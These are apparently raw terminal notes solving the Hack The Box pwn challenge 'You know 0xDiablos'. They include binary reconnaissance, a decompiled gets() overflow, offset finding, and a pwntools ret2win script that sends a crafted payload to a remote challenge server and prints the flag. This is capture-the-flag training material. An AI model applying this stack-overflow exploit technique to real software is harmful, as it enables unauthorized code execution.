@@ -1,0 +1,256 @@
+┌──(kali㉿kali)-[~/htb/pwn_you_know_0xdiablos]
+└─$ file vuln   
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
+                                                                                                                                              
+┌──(kali㉿kali)-[~/htb/pwn_you_know_0xdiablos]
+└─$ checksec vuln            
+[*] '/home/kali/htb/pwn_you_know_0xdiablos/vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+  
+┌──(kali㉿kali)-[~/htb/pwn_you_know_0xdiablos]
+└─$ strings vuln       
+tdX 
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+exit
+fopen
+puts
+printf
+fgets
+stdout
+setresgid
+getegid
+setvbuf
+__libc_start_main
+GLIBC_2.1
+GLIBC_2.0
+__gmon_start__
+[^_]
+flag.txt
+Hurry up and try in on server side.
+You know who are 0xDiablos: 
+;*2$" 
+GCC: (Debian 8.3.0-19) 8.3.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.6887
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+vuln.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+__x86.get_pc_thunk.bx
+printf@@GLIBC_2.0
+__x86.get_pc_thunk.bp
+vuln
+fgets@@GLIBC_2.0
+_edata
+getegid@@GLIBC_2.0
+__data_start
+puts@@GLIBC_2.0
+__gmon_start__
+exit@@GLIBC_2.0
+__dso_handle
+_IO_stdin_used
+__libc_start_main@@GLIBC_2.0
+__libc_csu_init
+setvbuf@@GLIBC_2.0
+fopen@@GLIBC_2.1
+_dl_relocate_static_pie
+_fp_hw
+stdout@@GLIBC_2.0
+__bss_start
+main
+__TMC_END__
+setresgid@@GLIBC_2.0
+flag
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got
+.got.plt
+.data
+.bss
+.comment
+                                                                                                                                              
+┌──(kali㉿kali)-[~/htb/pwn_you_know_0xdiablos]
+└─$ cyclic 200 | ./vuln       
+You know who are 0xDiablos: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+zsh: done                cyclic 200 | 
+zsh: segmentation fault  ./vuln
+                                                                                                                                               
+┌──(kali㉿kali)-[~/htb/pwn_you_know_0xdiablos]
+└─$ sudo dmesg |tail         
+[182121.835987] vuln[1470653]: segfault at 62616177 ip 0000000062616177 sp 00000000ff8eb090 error 14 in libc.so.6[f7c00000+22000] likely on CPU 0 (core 0, socket 0)
+[182121.836007] Code: Unable to access opcode bytes at 0x6261614d.
+                                                                                                                                               
+┌──(kali㉿kali)-[~/htb/pwn_you_know_0xdiablos]
+└─$ cyclic -l 0x62616177
+188
+
+/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
+
+void flag(int param_1,int param_2)
+
+{
+  char local_50 [64];
+  FILE *local_10;
+  
+  local_10 = fopen("flag.txt","r");
+  if (local_10 != (FILE *)0x0) {
+    fgets(local_50,0x40,local_10);
+    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
+      printf(local_50);
+    }
+    return;
+  }
+  puts("Hurry up and try in on server side.");
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+080491e2 <flag>:
+ 80491e2:       55                      push   %ebp
+ 80491e3:       89 e5                   mov    %esp,%ebp
+ 80491e5:       53                      push   %ebx
+ 80491e6:       83 ec 54                sub    $0x54,%esp
+ 80491e9:       e8 32 ff ff ff          call   8049120 <__x86.get_pc_thunk.bx>
+ 80491ee:       81 c3 12 2e 00 00       add    $0x2e12,%ebx
+ 80491f4:       83 ec 08                sub    $0x8,%esp
+ 80491f7:       8d 83 08 e0 ff ff       lea    -0x1ff8(%ebx),%eax
+ 80491fd:       50                      push   %eax
+ 80491fe:       8d 83 0a e0 ff ff       lea    -0x1ff6(%ebx),%eax
+ 8049204:       50                      push   %eax
+ 8049205:       e8 a6 fe ff ff          call   80490b0 <fopen@plt>
+ 804920a:       83 c4 10                add    $0x10,%esp
+ 804920d:       89 45 f4                mov    %eax,-0xc(%ebp)
+ 8049210:       83 7d f4 00             cmpl   $0x0,-0xc(%ebp)
+ 8049214:       75 1c                   jne    8049232 <flag+0x50>
+ 8049216:       83 ec 0c                sub    $0xc,%esp
+ 8049219:       8d 83 14 e0 ff ff       lea    -0x1fec(%ebx),%eax
+ 804921f:       50                      push   %eax
+ 8049220:       e8 4b fe ff ff          call   8049070 <puts@plt>
+ 8049225:       83 c4 10                add    $0x10,%esp
+ 8049228:       83 ec 0c                sub    $0xc,%esp
+ 804922b:       6a 00                   push   $0x0
+ 804922d:       e8 4e fe ff ff          call   8049080 <exit@plt>
+ 8049232:       83 ec 04                sub    $0x4,%esp
+ 8049235:       ff 75 f4                push   -0xc(%ebp)
+ 8049238:       6a 40                   push   $0x40
+ 804923a:       8d 45 b4                lea    -0x4c(%ebp),%eax
+ 804923d:       50                      push   %eax
+ 804923e:       e8 0d fe ff ff          call   8049050 <fgets@plt>
+ 8049243:       83 c4 10                add    $0x10,%esp
+ 8049246:       81 7d 08 ef be ad de    cmpl   $0xdeadbeef,0x8(%ebp)
+ 804924d:       75 1a                   jne    8049269 <flag+0x87>
+ 804924f:       81 7d 0c 0d d0 de c0    cmpl   $0xc0ded00d,0xc(%ebp)
+ 8049256:       75 14                   jne    804926c <flag+0x8a>
+ 8049258:       83 ec 0c                sub    $0xc,%esp
+ 804925b:       8d 45 b4                lea    -0x4c(%ebp),%eax
+ 804925e:       50                      push   %eax
+ 804925f:       e8 cc fd ff ff          call   8049030 <printf@plt>
+ 8049264:       83 c4 10                add    $0x10,%esp
+ 8049267:       eb 04                   jmp    804926d <flag+0x8b>
+ 8049269:       90                      nop
+ 804926a:       eb 01                   jmp    804926d <flag+0x8b>
+ 804926c:       90                      nop
+ 804926d:       8b 5d fc                mov    -0x4(%ebp),%ebx
+ 8049270:       c9                      leave
+ 8049271:       c3                      ret
+
+void vuln(void)
+
+{
+  char local_bc [180];
+  
+  gets(local_bc);
+  puts(local_bc);
+  return;
+}
+
+
+/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
+
+undefined4 main(void)
+
+{
+  __gid_t __rgid;
+  
+  setvbuf(stdout,(char *)0x0,2,0);
+  __rgid = getegid();
+  setresgid(__rgid,__rgid,__rgid);
+  puts("You know who are 0xDiablos: ");
+  vuln();
+  return 0;
+}
+
+$ cat you_know_0xdiablos.py
+#!/usr/bin/env python
+import sys
+from pwn import *
+
+context.update(arch='i386', os='linux', endian='little')
+elf = ELF("./vuln")
+
+offset = 188			
+flag = p32(0x080491e2) #flag function
+
+# craft exploit: offset + flag() + padding + parameter 1 + parameter 2
+exploit = b'A' * offset + p32(elf.symbols['flag']) + p32(0x90909090) + p32(0xdeadbeef) + p32(0xc0ded00d)
+#exploit = b'A' * offset + p32(elf.symbols['flag']) + p32(elf.symbols['got.exit']) + p32(0xdeadbeef) + p32(0xc0ded00d) 
+
+r = remote("64.227.37.161",30080)
+#r = elf.process()
+r.sendlineafter(":", exploit)
+r.interactive()
+r.close()
+
+┌──(kali㉿kali)-[~/htb/pwn_you_know_0xdiablos]
+└─$ ./you_know_0xdiablos.py 
+[*] '/home/kali/htb/pwn_you_know_0xdiablos/vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+[+] Opening connection to 64.227.37.161 on port 30080: Done
+/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  res = self.recvuntil(delim, timeout=timeout)
+[*] Switching to interactive mode
+ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xde\xc0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x9\x90\x90\x90\x90ﾭ\xde
+$                                                                 HTB{0ur_Buff3r_1s_not_healthy}[*] Got EOF while reading in interactive
+$ 
